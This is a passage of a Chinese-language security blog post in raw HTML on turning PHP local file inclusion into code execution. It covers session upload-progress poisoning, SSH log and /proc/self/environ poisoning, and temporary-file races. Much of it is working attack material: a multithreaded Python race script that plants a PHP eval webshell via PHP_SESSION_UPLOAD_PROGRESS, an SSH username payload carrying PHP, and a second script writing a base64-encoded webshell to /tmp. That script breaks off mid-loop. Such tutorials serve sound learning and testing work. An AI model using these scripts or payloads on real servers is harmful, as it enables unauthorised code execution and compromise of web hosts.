&lt;li&gt;&lt;code&gt;session.use_strict_mode=0&lt;/code&gt;，表明用户可以自定义Session ID。具体而言，我们在Cookie中设置&lt;code&gt;Cookie:PHPSESSID=test&lt;/code&gt;，PHP将会在服务器上session存储的位置创建一个文件&lt;code&gt;sess_test&lt;/code&gt;，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由&lt;code&gt;session.upload_progress.prefix&lt;/code&gt;+&lt;code&gt;session.upload_progress_name&lt;/code&gt;组成，最后被写入&lt;code&gt;sess_test&lt;/code&gt;文件中。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;利用条件&#34;&gt;利用条件&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;能够创建session文件并知晓路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;内容可控&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;session路径&#34;&gt;session路径&lt;/h4&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 3858; 
			flex-basis: 9260px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-6/image-20220220153139371.png&#34; data-size=&#34;926x24&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-6/image-20220220153139371.png&#34;
			width=&#34;926&#34;
			height=&#34;24&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-6/image-20220220153139371_hu3d839529f0c87b5e57d2cecb20416c38_2431_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-6/image-20220220153139371_hu3d839529f0c87b5e57d2cecb20416c38_2431_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;常见：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/tmp/&lt;/li&gt;
&lt;li&gt;/tmp/sessions&lt;/li&gt;
&lt;li&gt;/var/lib/php/&lt;/li&gt;
&lt;li&gt;/var/lib/php/sessions/&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;利用思路&#34;&gt;利用思路&lt;/h4&gt;
&lt;p&gt;由于&lt;strong&gt;上传文件结束后，session文件会被清除&lt;/strong&gt;，我们可以上传大文件，并在上传时&lt;strong&gt;自定义session&lt;/strong&gt;让服务端创建session文件；同时使用条件竞争，在session文件被删除前抢先进行文件包含。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bp抓包，跑上传大文件的intrude&lt;/li&gt;
&lt;li&gt;跑文件包含的intrude&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用脚本多线程跑：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;io&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;threading&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;sessid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;whoami&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BytesIO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1:7777/test56.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;haha.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHPSESSID&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sessid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1:7777/test56.php?file=session/sess_&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sessid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha.txt&amp;#39;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;clear&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+++++++++++++]retry&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Event&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xrange&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; 
            &lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xrange&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;threading&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;event&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ssh-log&#34;&gt;SSH log&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;知晓SSH log路径，且可读&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般在&lt;code&gt;/var/log/auth.log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ssh &amp;lt;?php phpinfo();?&amp;gt;@ip
 
再进行本地包含
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;environ&#34;&gt;environ&lt;/h3&gt;
&lt;p&gt;PHP以cgi方式运行,&lt;code&gt;proc/self/environ&lt;/code&gt;会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;条件：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CGI方式运行&lt;/li&gt;
&lt;li&gt;environ文件可读&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;临时文件&#34;&gt;临时文件&lt;/h3&gt;
&lt;p&gt;上述这些方法要求能够包含不再Web目录下的文件，一旦PHP设置了open_basedir，则很可能会使得攻击失效。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;向服务器上任意 php 文件以 form-data 式提交请求上传数据时，会生成临时文件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 172; 
			flex-basis: 414px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-6/image-20220220160912031.png&#34; data-size=&#34;574x332&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-6/image-20220220160912031.png&#34;
			width=&#34;574&#34;
			height=&#34;332&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-6/image-20220220160912031_hu32b936f6d8558029cbc85dedcf72f901_92822_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-6/image-20220220160912031_hu32b936f6d8558029cbc85dedcf72f901_92822_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;临时文件在短时间内会被删除，所以需要竞争条件&lt;/li&gt;
&lt;li&gt;而临时文件名也不知道，如果服务器上有phpinfo，可以从&lt;code&gt;upload_tmp_dir&lt;/code&gt;上获取&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考exp：https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py&lt;/p&gt;
&lt;h3 id=&#34;自包含&#34;&gt;自包含&lt;/h3&gt;
&lt;p&gt;让 php 包含自身从而导致死循环然后 php 就会崩溃，那么它所产生的临时文件就会被保留，而不会被清除，再进行包含。&lt;/p&gt;
&lt;p&gt;思路：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上传产生临时文件&lt;/li&gt;
&lt;li&gt;phpinfo获取临时文件名&lt;/li&gt;
&lt;li&gt;自包含&lt;code&gt;/test.php?include=test.php&lt;/code&gt;形成无穷递归，中断删除过程&lt;/li&gt;
&lt;li&gt;本地包含&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;上传文件崩溃&#34;&gt;上传文件+崩溃&lt;/h3&gt;
&lt;p&gt;让 php 包含自身从而导致死循环然后 php 就会崩溃，如果请求中同时存在一个上传文件的请求，则上传的该文件就会被保留。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用脚本：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;itertools&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;charset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;letters&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;x.x.x.x&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;base_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;upload_file_to_include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;evil.jpg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;generate_tmp_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;webshell_content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php eval($_REQUEST[c]);?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;base64&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;strip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php if(file_put_contents(&amp;#34;/tmp/ssh_session_HD89q2&amp;#34;, base64_decode(&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#34;))){echo &amp;#34;flag&amp;#34;;}?&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;webshell_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;phpinfo_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/include.php?f=include.php&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;base_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;times&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xrange&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;times&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
